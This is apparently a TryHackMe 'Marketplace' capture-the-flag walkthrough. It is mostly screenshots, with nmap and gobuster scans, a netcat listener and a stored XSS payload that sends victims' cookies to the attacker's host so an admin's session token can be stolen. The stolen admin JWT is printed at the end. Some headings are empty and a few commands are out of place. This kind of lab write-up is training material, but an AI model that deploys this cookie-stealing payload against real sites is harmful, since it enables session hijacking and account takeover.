# The Marketplace

**Room Link:** [https://tryhackme.com/room/marketplace](https://tryhackme.com/room/marketplace)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:32768 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

##

##

## TCP/32768 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:32768 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```











<figure><img src="../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>



[https://jwt.io/](https://jwt.io/)

<figure><img src="../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>





I tried updating the token it didn't work

<figure><img src="../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
nc -lvnp 4444
```

**Browser**

```
<script>document.location='http://$KALI:4444/XSS/grabber.php?c='+document.cookie</script>
```

<figure><img src="../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

This was annoying because if I went to my posts it wouldn't work so I went to Jakes post and changed the number from 2 to 6 to get to the report page. Then just clicked the report button

<figure><img src="../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

we got a token from a user that isn't us

<figure><img src="../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>



We can see it is from micheal who is an admin.

<figure><img src="../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>





Sent again but this time just forwarded the request so we could see what that script was doing

<figure><img src="../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>



The script was printing the flag

<figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
apt update
apt install --only-upgrade firefox
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDE0NDQyMjF9.xj3pmRY59AwEUvay9LA4qUY-lZWEmvXOW8wewbyPetE
```

